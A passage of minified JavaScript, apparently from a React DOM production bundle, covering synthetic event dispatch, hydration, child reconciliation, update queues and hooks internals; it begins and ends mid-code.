e;case"keydown":case"keyup":w=IM;break;case"focusin":x="focus",w=xg;break;case"focusout":x="blur",w=xg;break;case"beforeblur":case"afterblur":w=xg;break;case"click":if(t.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":w=a_;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":w=uM;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":w=AM;break;case PT:case LT:case DT:w=dM;break;case OT:w=xM;break;case"scroll":w=lM;break;case"wheel":w=CM;break;case"copy":case"cut":case"paste":w=gM;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":w=c_}var k=(e&4)!==0,I=!k&&n==="scroll",A=k?p!==null?p+"Capture":null:p;k=[];for(var b=u,E;b!==null;){E=b;var O=E.stateNode;if(E.tag===5&&O!==null&&(E=O,A!==null&&(O=Eu(b,A),O!=null&&k.push(ku(b,O,E)))),I)break;b=b.return}0<k.length&&(p=new w(p,x,null,t,h),f.push({event:p,listeners:k}))}}if(!(e&7)){e:{if(p=n==="mouseover"||n==="pointerover",w=n==="mouseout"||n==="pointerout",p&&t!==Jm&&(x=t.relatedTarget||t.fromElement)&&($o(x)||x[cs]))break e;if((w||p)&&(p=h.window===h?h:(p=h.ownerDocument)?p.defaultView||p.parentWindow:window,w?(x=t.relatedTarget||t.toElement,w=u,x=x?$o(x):null,x!==null&&(I=va(x),x!==I||x.tag!==5&&x.tag!==6)&&(x=null)):(w=null,x=u),w!==x)){if(k=a_,O="onMouseLeave",A="onMouseEnter",b="mouse",(n==="pointerout"||n==="pointerover")&&(k=c_,O="onPointerLeave",A="onPointerEnter",b="pointer"),I=w==null?p:nl(w),E=x==null?p:nl(x),p=new k(O,b+"leave",w,t,h),p.target=I,p.relatedTarget=E,O=null,$o(h)===u&&(k=new k(A,b+"enter",x,t,h),k.target=E,k.relatedTarget=I,O=k),I=O,w&&x)t:{for(k=w,A=x,b=0,E=k;E;E=Fa(E))b++;for(E=0,O=A;O;O=Fa(O))E++;for(;0<b-E;)k=Fa(k),b--;for(;0<E-b;)A=Fa(A),E--;for(;b--;){if(k===A||A!==null&&k===A.alternate)break t;k=Fa(k),A=Fa(A)}k=null}else k=null;w!==null&&__(f,p,w,k,!1),x!==null&&I!==null&&__(f,I,x,k,!0)}}e:{if(p=u?nl(u):window,w=p.nodeName&&p.nodeName.toLowerCase(),w==="select"||w==="input"&&p.type==="file")var W=OM;else if(f_(p))if(kT)W=VM;else{W=UM;var q=BM}else(w=p.nodeName)&&w.toLowerCase()==="input"&&(p.type==="checkbox"||p.type==="radio")&&(W=jM);if(W&&(W=W(n,u))){xT(f,W,t,h);break e}q&&q(n,p,u),n==="focusout"&&(q=p._wrapperState)&&q.controlled&&p.type==="number"&&Km(p,"number",p.value)}switch(q=u?nl(u):window,n){case"focusin":(f_(q)||q.contentEditable==="true")&&(el=q,s0=u,su=null);break;case"focusout":su=s0=el=null;break;case"mousedown":o0=!0;break;case"contextmenu":case"mouseup":case"dragend":o0=!1,y_(f,t,h);break;case"selectionchange":if(WM)break;case"keydown":case"keyup":y_(f,t,h)}var L;if(aw)e:{switch(n){case"compositionstart":var N="onCompositionStart";break e;case"compositionend":N="onCompositionEnd";break e;case"compositionupdate":N="onCompositionUpdate";break e}N=void 0}else Xa?AT(n,t)&&(N="onCompositionEnd"):n==="keydown"&&t.keyCode===229&&(N="onCompositionStart");N&&(TT&&t.locale!=="ko"&&(Xa||N!=="onCompositionStart"?N==="onCompositionEnd"&&Xa&&(L=ST()):(Fs=h,iw="value"in Fs?Fs.value:Fs.textContent,Xa=!0)),q=nd(u,N),0<q.length&&(N=new l_(N,n,null,t,h),f.push({event:N,listeners:q}),L?N.data=L:(L=bT(t),L!==null&&(N.data=L)))),(L=MM?NM(n,t):PM(n,t))&&(u=nd(u,"onBeforeInput"),0<u.length&&(h=new l_("onBeforeInput","beforeinput",null,t,h),f.push({event:h,listeners:u}),h.data=L))}UT(f,e)})}function ku(n,e,t){return{instance:n,listener:e,currentTarget:t}}function nd(n,e){for(var t=e+"Capture",r=[];n!==null;){var i=n,s=i.stateNode;i.tag===5&&s!==null&&(i=s,s=Eu(n,t),s!=null&&r.unshift(ku(n,s,i)),s=Eu(n,e),s!=null&&r.push(ku(n,s,i))),n=n.return}return r}function Fa(n){if(n===null)return null;do n=n.return;while(n&&n.tag!==5);return n||null}function __(n,e,t,r,i){for(var s=e._reactName,o=[];t!==null&&t!==r;){var a=t,l=a.alternate,u=a.stateNode;if(l!==null&&l===r)break;a.tag===5&&u!==null&&(a=u,i?(l=Eu(t,s),l!=null&&o.unshift(ku(t,l,a))):i||(l=Eu(t,s),l!=null&&o.push(ku(t,l,a)))),t=t.return}o.length!==0&&n.push({event:e,listeners:o})}var KM=/\r\n?/g,GM=/\u0000|\uFFFD/g;function E_(n){return(typeof n=="string"?n:""+n).replace(KM,`
`).replace(GM,"")}function Yh(n,e,t){if(e=E_(e),E_(n)!==e&&t)throw Error(le(425))}function rd(){}var a0=null,l0=null;function c0(n,e){return n==="textarea"||n==="noscript"||typeof e.children=="string"||typeof e.children=="number"||typeof e.dangerouslySetInnerHTML=="object"&&e.dangerouslySetInnerHTML!==null&&e.dangerouslySetInnerHTML.__html!=null}var u0=typeof setTimeout=="function"?setTimeout:void 0,QM=typeof clearTimeout=="function"?clearTimeout:void 0,I_=typeof Promise=="function"?Promise:void 0,YM=typeof queueMicrotask=="function"?queueMicrotask:typeof I_<"u"?function(n){return I_.resolve(null).then(n).catch(ZM)}:u0;function ZM(n){setTimeout(function(){throw n})}function Dg(n,e){var t=e,r=0;do{var i=t.nextSibling;if(n.removeChild(t),i&&i.nodeType===8)if(t=i.data,t==="/$"){if(r===0){n.removeChild(i),Tu(e);return}r--}else t!=="$"&&t!=="$?"&&t!=="$!"||r++;t=i}while(t);Tu(e)}function Js(n){for(;n!=null;n=n.nextSibling){var e=n.nodeType;if(e===1||e===3)break;if(e===8){if(e=n.data,e==="$"||e==="$!"||e==="$?")break;if(e==="/$")return null}}return n}function S_(n){n=n.previousSibling;for(var e=0;n;){if(n.nodeType===8){var t=n.data;if(t==="$"||t==="$!"||t==="$?"){if(e===0)return n;e--}else t==="/$"&&e++}n=n.previousSibling}return null}var nc=Math.random().toString(36).slice(2),Ti="__reactFiber$"+nc,Cu="__reactProps$"+nc,cs="__reactContainer$"+nc,h0="__reactEvents$"+nc,JM="__reactListeners$"+nc,XM="__reactHandles$"+nc;function $o(n){var e=n[Ti];if(e)return e;for(var t=n.parentNode;t;){if(e=t[cs]||t[Ti]){if(t=e.alternate,e.child!==null||t!==null&&t.child!==null)for(n=S_(n);n!==null;){if(t=n[Ti])return t;n=S_(n)}return e}n=t,t=n.parentNode}return null}function ah(n){return n=n[Ti]||n[cs],!n||n.tag!==5&&n.tag!==6&&n.tag!==13&&n.tag!==3?null:n}function nl(n){if(n.tag===5||n.tag===6)return n.stateNode;throw Error(le(33))}function ap(n){return n[Cu]||null}var f0=[],rl=-1;function So(n){return{current:n}}function Nt(n){0>rl||(n.current=f0[rl],f0[rl]=null,rl--)}function Tt(n,e){rl++,f0[rl]=n.current,n.current=e}var po={},nr=So(po),vr=So(!1),sa=po;function Cl(n,e){var t=n.type.contextTypes;if(!t)return po;var r=n.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===e)return r.__reactInternalMemoizedMaskedChildContext;var i={},s;for(s in t)i[s]=e[s];return r&&(n=n.stateNode,n.__reactInternalMemoizedUnmaskedChildContext=e,n.__reactInternalMemoizedMaskedChildContext=i),i}function _r(n){return n=n.childContextTypes,n!=null}function id(){Nt(vr),Nt(nr)}function T_(n,e,t){if(nr.current!==po)throw Error(le(168));Tt(nr,e),Tt(vr,t)}function VT(n,e,t){var r=n.stateNode;if(e=e.childContextTypes,typeof r.getChildContext!="function")return t;r=r.getChildContext();for(var i in r)if(!(i in e))throw Error(le(108,BR(n)||"Unknown",i));return Kt({},t,r)}function sd(n){return n=(n=n.stateNode)&&n.__reactInternalMemoizedMergedChildContext||po,sa=nr.current,Tt(nr,n),Tt(vr,vr.current),!0}function A_(n,e,t){var r=n.stateNode;if(!r)throw Error(le(169));t?(n=VT(n,e,sa),r.__reactInternalMemoizedMergedChildContext=n,Nt(vr),Nt(nr),Tt(nr,n)):Nt(vr),Tt(vr,t)}var qi=null,lp=!1,Og=!1;function FT(n){qi===null?qi=[n]:qi.push(n)}function eN(n){lp=!0,FT(n)}function To(){if(!Og&&qi!==null){Og=!0;var n=0,e=ft;try{var t=qi;for(ft=1;n<t.length;n++){var r=t[n];do r=r(!0);while(r!==null)}qi=null,lp=!1}catch(i){throw qi!==null&&(qi=qi.slice(n+1)),fT(ew,To),i}finally{ft=e,Og=!1}}return null}var il=[],sl=0,od=null,ad=0,zr=[],Wr=0,oa=null,Ji=1,Xi="";function Oo(n,e){il[sl++]=ad,il[sl++]=od,od=n,ad=e}function zT(n,e,t){zr[Wr++]=Ji,zr[Wr++]=Xi,zr[Wr++]=oa,oa=n;var r=Ji;n=Xi;var i=32-ci(r)-1;r&=~(1<<i),t+=1;var s=32-ci(e)+i;if(30<s){var o=i-i%5;s=(r&(1<<o)-1).toString(32),r>>=o,i-=o,Ji=1<<32-ci(e)+i|t<<i|r,Xi=s+n}else Ji=1<<s|t<<i|r,Xi=n}function cw(n){n.return!==null&&(Oo(n,1),zT(n,1,0))}function uw(n){for(;n===od;)od=il[--sl],il[sl]=null,ad=il[--sl],il[sl]=null;for(;n===oa;)oa=zr[--Wr],zr[Wr]=null,Xi=zr[--Wr],zr[Wr]=null,Ji=zr[--Wr],zr[Wr]=null}var Mr=null,Cr=null,jt=!1,si=null;function WT(n,e){var t=Hr(5,null,null,0);t.elementType="DELETED",t.stateNode=e,t.return=n,e=n.deletions,e===null?(n.deletions=[t],n.flags|=16):e.push(t)}function b_(n,e){switch(n.tag){case 5:var t=n.type;return e=e.nodeType!==1||t.toLowerCase()!==e.nodeName.toLowerCase()?null:e,e!==null?(n.stateNode=e,Mr=n,Cr=Js(e.firstChild),!0):!1;case 6:return e=n.pendingProps===""||e.nodeType!==3?null:e,e!==null?(n.stateNode=e,Mr=n,Cr=null,!0):!1;case 13:return e=e.nodeType!==8?null:e,e!==null?(t=oa!==null?{id:Ji,overflow:Xi}:null,n.memoizedState={dehydrated:e,treeContext:t,retryLane:1073741824},t=Hr(18,null,null,0),t.stateNode=e,t.return=n,n.child=t,Mr=n,Cr=null,!0):!1;default:return!1}}function d0(n){return(n.mode&1)!==0&&(n.flags&128)===0}function p0(n){if(jt){var e=Cr;if(e){var t=e;if(!b_(n,e)){if(d0(n))throw Error(le(418));e=Js(t.nextSibling);var r=Mr;e&&b_(n,e)?WT(r,t):(n.flags=n.flags&-4097|2,jt=!1,Mr=n)}}else{if(d0(n))throw Error(le(418));n.flags=n.flags&-4097|2,jt=!1,Mr=n}}}function x_(n){for(n=n.return;n!==null&&n.tag!==5&&n.tag!==3&&n.tag!==13;)n=n.return;Mr=n}function Zh(n){if(n!==Mr)return!1;if(!jt)return x_(n),jt=!0,!1;var e;if((e=n.tag!==3)&&!(e=n.tag!==5)&&(e=n.type,e=e!=="head"&&e!=="body"&&!c0(n.type,n.memoizedProps)),e&&(e=Cr)){if(d0(n))throw $T(),Error(le(418));for(;e;)WT(n,e),e=Js(e.nextSibling)}if(x_(n),n.tag===13){if(n=n.memoizedState,n=n!==null?n.dehydrated:null,!n)throw Error(le(317));e:{for(n=n.nextSibling,e=0;n;){if(n.nodeType===8){var t=n.data;if(t==="/$"){if(e===0){Cr=Js(n.nextSibling);break e}e--}else t!=="$"&&t!=="$!"&&t!=="$?"||e++}n=n.nextSibling}Cr=null}}else Cr=Mr?Js(n.stateNode.nextSibling):null;return!0}function $T(){for(var n=Cr;n;)n=Js(n.nextSibling)}function Rl(){Cr=Mr=null,jt=!1}function hw(n){si===null?si=[n]:si.push(n)}var tN=vs.ReactCurrentBatchConfig;function Bc(n,e,t){if(n=t.ref,n!==null&&typeof n!="function"&&typeof n!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(le(309));var r=t.stateNode}if(!r)throw Error(le(147,n));var i=r,s=""+n;return e!==null&&e.ref!==null&&typeof e.ref=="function"&&e.ref._stringRef===s?e.ref:(e=function(o){var a=i.refs;o===null?delete a[s]:a[s]=o},e._stringRef=s,e)}if(typeof n!="string")throw Error(le(284));if(!t._owner)throw Error(le(290,n))}return n}function Jh(n,e){throw n=Object.prototype.toString.call(e),Error(le(31,n==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":n))}function k_(n){var e=n._init;return e(n._payload)}function HT(n){function e(A,b){if(n){var E=A.deletions;E===null?(A.deletions=[b],A.flags|=16):E.push(b)}}function t(A,b){if(!n)return null;for(;b!==null;)e(A,b),b=b.sibling;return null}function r(A,b){for(A=new Map;b!==null;)b.key!==null?A.set(b.key,b):A.set(b.index,b),b=b.sibling;return A}function i(A,b){return A=no(A,b),A.index=0,A.sibling=null,A}function s(A,b,E){return A.index=E,n?(E=A.alternate,E!==null?(E=E.index,E<b?(A.flags|=2,b):E):(A.flags|=2,b)):(A.flags|=1048576,b)}function o(A){return n&&A.alternate===null&&(A.flags|=2),A}function a(A,b,E,O){return b===null||b.tag!==6?(b=Wg(E,A.mode,O),b.return=A,b):(b=i(b,E),b.return=A,b)}function l(A,b,E,O){var W=E.type;return W===Ja?h(A,b,E.props.children,O,E.key):b!==null&&(b.elementType===W||typeof W=="object"&&W!==null&&W.$$typeof===Ps&&k_(W)===b.type)?(O=i(b,E.props),O.ref=Bc(A,b,E),O.return=A,O):(O=Mf(E.type,E.key,E.props,null,A.mode,O),O.ref=Bc(A,b,E),O.return=A,O)}function u(A,b,E,O){return b===null||b.tag!==4||b.stateNode.containerInfo!==E.containerInfo||b.stateNode.implementation!==E.implementation?(b=$g(E,A.mode,O),b.return=A,b):(b=i(b,E.children||[]),b.return=A,b)}function h(A,b,E,O,W){return b===null||b.tag!==7?(b=ta(E,A.mode,O,W),b.return=A,b):(b=i(b,E),b.return=A,b)}function f(A,b,E){if(typeof b=="string"&&b!==""||typeof b=="number")return b=Wg(""+b,A.mode,E),b.return=A,b;if(typeof b=="object"&&b!==null){switch(b.$$typeof){case Fh:return E=Mf(b.type,b.key,b.props,null,A.mode,E),E.ref=Bc(A,null,b),E.return=A,E;case Za:return b=$g(b,A.mode,E),b.return=A,b;case Ps:var O=b._init;return f(A,O(b._payload),E)}if($c(b)||Nc(b))return b=ta(b,A.mode,E,null),b.return=A,b;Jh(A,b)}return null}function p(A,b,E,O){var W=b!==null?b.key:null;if(typeof E=="string"&&E!==""||typeof E=="number")return W!==null?null:a(A,b,""+E,O);if(typeof E=="object"&&E!==null){switch(E.$$typeof){case Fh:return E.key===W?l(A,b,E,O):null;case Za:return E.key===W?u(A,b,E,O):null;case Ps:return W=E._init,p(A,b,W(E._payload),O)}if($c(E)||Nc(E))return W!==null?null:h(A,b,E,O,null);Jh(A,E)}return null}function w(A,b,E,O,W){if(typeof O=="string"&&O!==""||typeof O=="number")return A=A.get(E)||null,a(b,A,""+O,W);if(typeof O=="object"&&O!==null){switch(O.$$typeof){case Fh:return A=A.get(O.key===null?E:O.key)||null,l(b,A,O,W);case Za:return A=A.get(O.key===null?E:O.key)||null,u(b,A,O,W);case Ps:var q=O._init;return w(A,b,E,q(O._payload),W)}if($c(O)||Nc(O))return A=A.get(E)||null,h(b,A,O,W,null);Jh(b,O)}return null}function x(A,b,E,O){for(var W=null,q=null,L=b,N=b=0,B=null;L!==null&&N<E.length;N++){L.index>N?(B=L,L=null):B=L.sibling;var z=p(A,L,E[N],O);if(z===null){L===null&&(L=B);break}n&&L&&z.alternate===null&&e(A,L),b=s(z,b,N),q===null?W=z:q.sibling=z,q=z,L=B}if(N===E.length)return t(A,L),jt&&Oo(A,N),W;if(L===null){for(;N<E.length;N++)L=f(A,E[N],O),L!==null&&(b=s(L,b,N),q===null?W=L:q.sibling=L,q=L);return jt&&Oo(A,N),W}for(L=r(A,L);N<E.length;N++)B=w(L,A,N,E[N],O),B!==null&&(n&&B.alternate!==null&&L.delete(B.key===null?N:B.key),b=s(B,b,N),q===null?W=B:q.sibling=B,q=B);return n&&L.forEach(function($){return e(A,$)}),jt&&Oo(A,N),W}function k(A,b,E,O){var W=Nc(E);if(typeof W!="function")throw Error(le(150));if(E=W.call(E),E==null)throw Error(le(151));for(var q=W=null,L=b,N=b=0,B=null,z=E.next();L!==null&&!z.done;N++,z=E.next()){L.index>N?(B=L,L=null):B=L.sibling;var $=p(A,L,z.value,O);if($===null){L===null&&(L=B);break}n&&L&&$.alternate===null&&e(A,L),b=s($,b,N),q===null?W=$:q.sibling=$,q=$,L=B}if(z.done)return t(A,L),jt&&Oo(A,N),W;if(L===null){for(;!z.done;N++,z=E.next())z=f(A,z.value,O),z!==null&&(b=s(z,b,N),q===null?W=z:q.sibling=z,q=z);return jt&&Oo(A,N),W}for(L=r(A,L);!z.done;N++,z=E.next())z=w(L,A,N,z.value,O),z!==null&&(n&&z.alternate!==null&&L.delete(z.key===null?N:z.key),b=s(z,b,N),q===null?W=z:q.sibling=z,q=z);return n&&L.forEach(function(K){return e(A,K)}),jt&&Oo(A,N),W}function I(A,b,E,O){if(typeof E=="object"&&E!==null&&E.type===Ja&&E.key===null&&(E=E.props.children),typeof E=="object"&&E!==null){switch(E.$$typeof){case Fh:e:{for(var W=E.key,q=b;q!==null;){if(q.key===W){if(W=E.type,W===Ja){if(q.tag===7){t(A,q.sibling),b=i(q,E.props.children),b.return=A,A=b;break e}}else if(q.elementType===W||typeof W=="object"&&W!==null&&W.$$typeof===Ps&&k_(W)===q.type){t(A,q.sibling),b=i(q,E.props),b.ref=Bc(A,q,E),b.return=A,A=b;break e}t(A,q);break}else e(A,q);q=q.sibling}E.type===Ja?(b=ta(E.props.children,A.mode,O,E.key),b.return=A,A=b):(O=Mf(E.type,E.key,E.props,null,A.mode,O),O.ref=Bc(A,b,E),O.return=A,A=O)}return o(A);case Za:e:{for(q=E.key;b!==null;){if(b.key===q)if(b.tag===4&&b.stateNode.containerInfo===E.containerInfo&&b.stateNode.implementation===E.implementation){t(A,b.sibling),b=i(b,E.children||[]),b.return=A,A=b;break e}else{t(A,b);break}else e(A,b);b=b.sibling}b=$g(E,A.mode,O),b.return=A,A=b}return o(A);case Ps:return q=E._init,I(A,b,q(E._payload),O)}if($c(E))return x(A,b,E,O);if(Nc(E))return k(A,b,E,O);Jh(A,E)}return typeof E=="string"&&E!==""||typeof E=="number"?(E=""+E,b!==null&&b.tag===6?(t(A,b.sibling),b=i(b,E),b.return=A,A=b):(t(A,b),b=Wg(E,A.mode,O),b.return=A,A=b),o(A)):t(A,b)}return I}var Ml=HT(!0),qT=HT(!1),ld=So(null),cd=null,ol=null,fw=null;function dw(){fw=ol=cd=null}function pw(n){var e=ld.current;Nt(ld),n._currentValue=e}function g0(n,e,t){for(;n!==null;){var r=n.alternate;if((n.childLanes&e)!==e?(n.childLanes|=e,r!==null&&(r.childLanes|=e)):r!==null&&(r.childLanes&e)!==e&&(r.childLanes|=e),n===t)break;n=n.return}}function wl(n,e){cd=n,fw=ol=null,n=n.dependencies,n!==null&&n.firstContext!==null&&(n.lanes&e&&(wr=!0),n.firstContext=null)}function Qr(n){var e=n._currentValue;if(fw!==n)if(n={context:n,memoizedValue:e,next:null},ol===null){if(cd===null)throw Error(le(308));ol=n,cd.dependencies={lanes:0,firstContext:n}}else ol=ol.next=n;return e}var Ho=null;function gw(n){Ho===null?Ho=[n]:Ho.push(n)}function KT(n,e,t,r){var i=e.interleaved;return i===null?(t.next=t,gw(e)):(t.next=i.next,i.next=t),e.interleaved=t,us(n,r)}function us(n,e){n.lanes|=e;var t=n.alternate;for(t!==null&&(t.lanes|=e),t=n,n=n.return;n!==null;)n.childLanes|=e,t=n.alternate,t!==null&&(t.childLanes|=e),t=n,n=n.return;return t.tag===3?t.stateNode:null}var Ls=!1;function mw(n){n.updateQueue={baseState:n.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function GT(n,e){n=n.updateQueue,e.updateQueue===n&&(e.updateQueue={baseState:n.baseState,firstBaseUpdate:n.firstBaseUpdate,lastBaseUpdate:n.lastBaseUpdate,shared:n.shared,effects:n.effects})}function ss(n,e){return{eventTime:n,lane:e,tag:0,payload:null,callback:null,next:null}}function Xs(n,e,t){var r=n.updateQueue;if(r===null)return null;if(r=r.shared,Je&2){var i=r.pending;return i===null?e.next=e:(e.next=i.next,i.next=e),r.pending=e,us(n,t)}return i=r.interleaved,i===null?(e.next=e,gw(r)):(e.next=i.next,i.next=e),r.interleaved=e,us(n,t)}function Af(n,e,t){if(e=e.updateQueue,e!==null&&(e=e.shared,(t&4194240)!==0)){var r=e.lanes;r&=n.pendingLanes,t|=r,e.lanes=t,tw(n,t)}}function C_(n,e){var t=n.updateQueue,r=n.alternate;if(r!==null&&(r=r.updateQueue,t===r)){var i=null,s=null;if(t=t.firstBaseUpdate,t!==null){do{var o={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};s===null?i=s=o:s=s.next=o,t=t.next}while(t!==null);s===null?i=s=e:s=s.next=e}else i=s=e;t={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:s,shared:r.shared,effects:r.effects},n.updateQueue=t;return}n=t.lastBaseUpdate,n===null?t.firstBaseUpdate=e:n.next=e,t.lastBaseUpdate=e}function ud(n,e,t,r){var i=n.updateQueue;Ls=!1;var s=i.firstBaseUpdate,o=i.lastBaseUpdate,a=i.shared.pending;if(a!==null){i.shared.pending=null;var l=a,u=l.next;l.next=null,o===null?s=u:o.next=u,o=l;var h=n.alternate;h!==null&&(h=h.updateQueue,a=h.lastBaseUpdate,a!==o&&(a===null?h.firstBaseUpdate=u:a.next=u,h.lastBaseUpdate=l))}if(s!==null){var f=i.baseState;o=0,h=u=l=null,a=s;do{var p=a.lane,w=a.eventTime;if((r&p)===p){h!==null&&(h=h.next={eventTime:w,lane:0,tag:a.tag,payload:a.payload,callback:a.callback,next:null});e:{var x=n,k=a;switch(p=e,w=t,k.tag){case 1:if(x=k.payload,typeof x=="function"){f=x.call(w,f,p);break e}f=x;break e;case 3:x.flags=x.flags&-65537|128;case 0:if(x=k.payload,p=typeof x=="function"?x.call(w,f,p):x,p==null)break e;f=Kt({},f,p);break e;case 2:Ls=!0}}a.callback!==null&&a.lane!==0&&(n.flags|=64,p=i.effects,p===null?i.effects=[a]:p.push(a))}else w={eventTime:w,lane:p,tag:a.tag,payload:a.payload,callback:a.callback,next:null},h===null?(u=h=w,l=f):h=h.next=w,o|=p;if(a=a.next,a===null){if(a=i.shared.pending,a===null)break;p=a,a=p.next,p.next=null,i.lastBaseUpdate=p,i.shared.pending=null}}while(1);if(h===null&&(l=f),i.baseState=l,i.firstBaseUpdate=u,i.lastBaseUpdate=h,e=i.shared.interleaved,e!==null){i=e;do o|=i.lane,i=i.next;while(i!==e)}else s===null&&(i.shared.lanes=0);la|=o,n.lanes=o,n.memoizedState=f}}function R_(n,e,t){if(n=e.effects,e.effects=null,n!==null)for(e=0;e<n.length;e++){var r=n[e],i=r.callback;if(i!==null){if(r.callback=null,r=t,typeof i!="function")throw Error(le(191,i));i.call(r)}}}var lh={},xi=So(lh),Ru=So(lh),Mu=So(lh);function qo(n){if(n===lh)throw Error(le(174));return n}function yw(n,e){switch(Tt(Mu,e),Tt(Ru,n),Tt(xi,lh),n=e.nodeType,n){case 9:case 11:e=(e=e.documentElement)?e.namespaceURI:Qm(null,"");break;default:n=n===8?e.parentNode:e,e=n.namespaceURI||null,n=n.tagName,e=Qm(e,n)}Nt(xi),Tt(xi,e)}function Nl(){Nt(xi),Nt(Ru),Nt(Mu)}function QT(n){qo(Mu.current);var e=qo(xi.current),t=Qm(e,n.type);e!==t&&(Tt(Ru,n),Tt(xi,t))}function ww(n){Ru.current===n&&(Nt(xi),Nt(Ru))}var Wt=So(0);function hd(n){for(var e=n;e!==null;){if(e.tag===13){var t=e.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return e}else if(e.tag===19&&e.memoizedProps.revealOrder!==void 0){if(e.flags&128)return e}else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===n)break;for(;e.sibling===null;){if(e.return===null||e.return===n)return null;e=e.return}e.sibling.return=e.return,e=e.sibling}return null}var Bg=[];function vw(){for(var n=0;n<Bg.length;n++)Bg[n]._workInProgressVersionPrimary=null;Bg.length=0}var bf=vs.ReactCurrentDispatcher,Ug=vs.ReactCurrentBatchConfig,aa=0,qt=null,gn=null,Tn=null,fd=!1,ou=!1,Nu=0,nN=0;function $n(){throw Error(le(321))}function _w(n,e){if(e===null)return!1;for(var t=0;t<e.length&&t<n.length;t++)if(!pi(n[t],e[t]))return!1;return!0}function Ew(n,e,t,r,i,s){if(aa=s,qt=e,e.memoizedState=null,e.updateQueue=null,e.lanes=0,bf.current=n===null||n.memoizedState===null?oN:aN,n=t(r,i),ou){s=0;do{if(ou=!1,Nu=0,25<=s)throw Error(le(301));s+=1,Tn=gn=null,e.updateQueue=null,bf.current=lN,n=t(r,i)}while(ou)}if(bf.current=dd,e=gn!==null&&gn.next!==null,aa=0,Tn=gn=qt=null,fd=!1,e)throw Error(le(300));return n}function Iw(){var n=Nu!==0;return Nu=0,n}function _i(){var n={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Tn===null?qt.memoizedState=Tn=n:Tn=Tn.next=n,Tn}function Yr(){if(gn===null){var n=qt.alternate;n=n!==null?n.memoizedState:null}else n=gn.next;var e=Tn===null?qt.memoizedState:Tn.next;if(e!==null)Tn=e,gn=n;else{if(n===null)throw Error(le(310));gn=n,n={memoizedState:gn.memoizedState,baseState:gn.baseState,baseQueue:gn.baseQueue,queue:gn.queue,next:null},Tn===null?qt.memoizedState=Tn=n:Tn=Tn.next=n}return Tn}function Pu(n,e){return typeof e=="function"?e(n):e}function jg(n){var e=Yr(),t=e.queue;if(t===null)throw Error(le(311));t.lastRenderedReducer=n;var r=gn,i=r.baseQueue,s=t.pending;if(s!==null){if(i!==null){var o=i.next;i.next=s.next,s.next=o}r.baseQueue=i=s,t.pending=null}if(i!==null){s=i.next,r=r.baseState;var a=o=null,l=null,u=s;do{var h=u.lane;if((aa&h)===h)l!==null&&(l=l.next={lane:0,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),r=u.hasEagerState?u.eagerState:n(r,u.action);else{var f={lane:h,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null};l===null?(a=l=f,o=r):l=l.next=f,qt.lanes|=h,la|=h}u=u.next}while(u!==null&&u!==s);l===null?o=r:l.next=a,pi(r,e.memoizedState)||(wr=!0),e.memoizedState=r,e.baseState=o,e.baseQueue=l,t.lastRenderedState=r}if(n=t.interleaved,n!==null){i=n;do s=i.lane,qt.lanes|=s,la|=s,i=i.next;while(i!==n)}else i===null&&(t.lanes=0);return[e.memoizedState,t.dispatch]}function Vg(n){var e=Yr(),t=e.queue;if(t===null)throw Error(le(311));t.lastRenderedReducer=n;var r=t.dispatch,i=t.pending,s=e.memoizedState;if(i!==null){t.pending=null;var o=i=i.next;do s=n(s,o.action),o=o.next;while(o!==i);pi(s,e.memoizedState)||(wr=!0),e.memoizedState=s,e.baseQueue===null&&(e.baseState=s),t.lastRenderedState=s}return[s,r]}function YT(){}function ZT(n,e){var t=qt,r=Yr(),i=e(),s=!pi(r.memoizedState,i);if(s&&(r.memoizedState=i,wr=!0),r=r.queue,Sw(eA.bind(null,t,r,n),[n]),r.getSnapshot!==e||s||Tn!==null&&Tn.memoizedState.tag&1){if(t.flags|=2048,Lu(9,XT.bind(null,t,r,i,e),void 0,null),bn===null)throw Error(le(349));aa&30||JT(t,e,i)}return i}function JT(n,e,t){n.flags|=16384,n={getSnapshot:e,value:t},e=qt.updateQueue,e===null?(e={lastEffect:null,stores:null},qt.updateQueue=e,e.stores=[n]):(t=e.stores,t===null?e.stores=[n]:t.push(n))}function XT(n,e,t,r){e.value=t,e.getSnapshot=r,tA(e)&&nA(n)}function eA(n,e,t){return t(function(){tA(e)&&nA(n)})}function tA(n){var e=n.getSnapshot;n=n.value;try{var t=e();return!pi(n,t)}catch{return!0}}function nA(n){var e=us(n,1);e!==null&&ui(e,n,1,-1)}function M_(n){var e=_i();return typeof n=="function"&&(n=n()),e.memoizedState=e.baseState=n,n={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Pu,lastRenderedState:n},e.queue=n,n=n.dispatch=sN.bind(null,qt,n),[e.memoizedState,n]}function Lu(n,e,t,r){return n={tag:n,create:e,destroy:t,deps:r,next:null},e=qt.updateQueue,e===null?(e={lastEffect:null,stores:null},qt.updateQueue=e,e.lastEffect=n.next=n):(t=e.lastEffect,t===null?e.lastEffect=n.next=n:(r=t.next,t.next=n,n.next=r,e.lastEffect=n)),n}function rA(){return Yr().memoizedState}function xf(n,e,t,r){var i=_i();qt.flags|=n,i.memoizedState=Lu(1|e,t,void 0,r===void 0?null:r)}function cp(n,e,t,r){var i=Yr();r=r===void 0?null:r;var s=void 0;if(gn!==null){var o=gn.memoizedState;if(s=o.destroy,r!==null&&_w(r,o.deps)){i.memoizedState=Lu(e,t,s,r);return}}qt.flags|=n,i.memoizedState=Lu(1|e,t,s,r)}function N_(n,e){return xf(8390656,8,n,e)}function Sw(n,e){return cp(2048,8,n,e)}function iA(n,e){return 